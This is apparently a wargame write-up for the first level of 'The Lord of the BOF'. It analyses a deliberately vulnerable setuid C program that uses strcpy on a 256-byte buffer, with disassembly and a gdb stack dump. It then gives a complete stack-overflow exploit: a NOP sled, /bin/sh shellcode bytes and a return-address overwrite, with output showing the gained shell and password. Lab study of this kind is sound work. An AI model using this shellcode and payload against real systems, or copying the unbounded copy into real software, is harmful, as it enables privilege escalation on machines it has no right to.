# Level 0, Gate -> Gremlin

## gremlin.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - gremlin
        - simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];           // -> 256 bytes char buffer initialized
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);    // -> strcpy() does not evaluate copying buffer length, enabling stack overflow
    printf("%s\n", buffer);
}
```

## Analysis

### Disassembling the "gremlin"

```sh
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,0x100
0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1
0x804843d <main+13>:    jg     0x8048456 <main+38>
0x804843f <main+15>:    push   0x80484e0
0x8048444 <main+20>:    call   0x8048350 <printf>
0x8048449 <main+25>:    add    %esp,4
0x804844c <main+28>:    push   0
0x804844e <main+30>:    call   0x8048360 <exit>
0x8048453 <main+35>:    add    %esp,4
0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048459 <main+41>:    add    %eax,4
0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax]
0x804845e <main+46>:    push   %edx
0x804845f <main+47>:    lea    %eax,[%ebp-256]          -> [%ebp-256] = char buffer[256]
0x8048465 <main+53>:    push   %eax
0x8048466 <main+54>:    call   0x8048370 <strcpy>
0x804846b <main+59>:    add    %esp,8
0x804846e <main+62>:    lea    %eax,[%ebp-256]
0x8048474 <main+68>:    push   %eax
0x8048475 <main+69>:    push   0x80484ec
0x804847a <main+74>:    call   0x8048350 <printf>
0x804847f <main+79>:    add    %esp,8
0x8048482 <main+82>:    leave
0x8048483 <main+83>:    ret
0x8048484 <main+84>:    nop
End of assembler dump.
```

### Estimated Stack Structure

```c
|  char buffer[256] | [%ebp-256]
|  SFP              | [%ebp]
|  RET              | [%ebp+4]
|  ARGC             | [%ebp+8]
|  ARGV[0]          | [%ebp+12]
```

### Observed Stack Structure (bp at *main+62)

```sh
(gdb) run `python -c "print 'A'*256"`
Starting program: /home/gate/gremlin-cp `python -c "print 'A'*256"`

Breakpoint 1, 0x804846e in main ()
(gdb) x/200x $esp
0xbffff928:     0x41414141      0x41414141      0x41414141      0x41414141  -> buffer[256]
0xbffff938:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff948:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff958:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff968:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff978:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff988:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff998:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa08:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa18:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa28:     0xbffffa00      0x400309cb      0x00000002      0xbffffa74  -> SFP, RET, ARGC, &ARGV[0]
0xbffffa38:     0xbffffa80      0x40013868      0x00000002      0x08048380
0xbffffa48:     0x00000000      0x080483a1      0x08048430      0x00000002
```

## Exploit

### How to pwn

간단한 RET Overwrite (AKA EIP Overwrite)

버퍼에 쉘코드를 넣고, main 함수 스택 프레임의 리턴 주소를 변조해 실행 흐름을 쉘코드 쪽으로 넘깁니다. 이 프로그램에넌 setuid가 설정되어 있기 때문에
[여기서](https://www.shellblade.net/shellcode.html) `/bin/sh`을 실행시키는 쉘코드를 여기서 가져왔습니다.

```txt
NOP Sled + Shellcode + Shellcode Address
```

버퍼에

### Payload Structure

```c
'\x90'*236    # NOP sled
+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'      # Shellcode
+
'\x68\xf9\xff\xbf'      # Designated shellcode address in stack
```

### Shellcode (24 bytes)

```c
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

### Final Payload

```sh
./gremlin `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\x90'*36+'\x68\xf9\xff\xbf'"`
```

## Result

```sh
[gate@localhost gate]$ ./gremlin `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\x90'*36+'\x68\xf9\xff\xbf'"`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                                                           ̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒h▒▒▒
bash$ id
uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
bash$ my-pass
euid = 501
hello bof world
```